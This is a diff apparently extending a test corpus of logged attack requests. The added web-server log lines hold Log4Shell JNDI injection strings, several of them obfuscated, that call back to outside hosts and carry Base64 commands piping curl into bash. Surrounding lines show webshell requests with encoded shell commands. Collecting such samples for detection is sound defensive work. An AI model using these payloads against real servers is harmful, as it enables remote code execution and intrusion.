@@ -1121,4 +1121,12 @@ POST http://api.ipify.org/?Z70153395332Q1
 GET http://cccc.uochb.cas.cz/50/1/0001/
 GET /manage/webshell/u?s=5&w=218&h=15&k=%0a&l=62&_=5621298674064
 GET /manage/webshell/u?s=5&w=218&h=15&k=%73%65%72%76%69%63%65%0a%73%73%68%0a%64%69%73%61%62%6c%65%0a&l=62&_=5621298674064
-
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /$%7Bjndi:dns://127.0.0.1/securityscan-http80%7D HTTP/1.1" 301 162 "${jndi:dns://127.0.0.1/securityscan-http80}" "${jndi:dns://127.0.0.1/securityscan-http80}" "-"
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /?x=${jndi:ldap://127.0.0.1:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjTU5OjgwKXxiYXNo} HTTP/1.1" 301 162 "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://127.0.0.1:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1LjU0LjE2MC4xNDk6KXxiYXNo}" "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://127.0.0.1:12344/Basic/Command/Base64/KGN1cmwgLXMgMTk1L4yMDcuMTU5OjgwKXxiYXNo}" "-"
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /$%7Bjndi:dns://45.83.64.1/securityscan-https443%7D HTTP/1.1" 404 524 "${jndi:dns://45.83.64.1/securityscan-https443}" "${jndi:dns://45.83.64.1/securityscan-https443}" "-"
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET / HTTP/1.1" 200 733 "-" "${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}" "-"
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /favicon.ico HTTP/1.1" 404 524 "-" "${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}" "-"
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /app/custom/assets/favicon/favicon-32x32.png HTTP/1.1" 200 823 "-" "${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}" "-"
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET / HTTP/1.1" 200 733 "-" "${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}" "-"
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /favicon.ico HTTP/1.1" 404 524 "-" "${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}" "-"
+Jan 01 00:00:00 XXX xxx[0]: 127.0.0.1 - - [01/Jan/1970:00:00:00:00 +0000] "GET /app/custom/assets/favicon/favicon.ico HTTP/1.1" 200 7406 "-" "${jndi:${lower:l}${lower:d}a${lower:p}://world443.log4j.bin${upper:a}ryedge.io:80/callback}" "-"
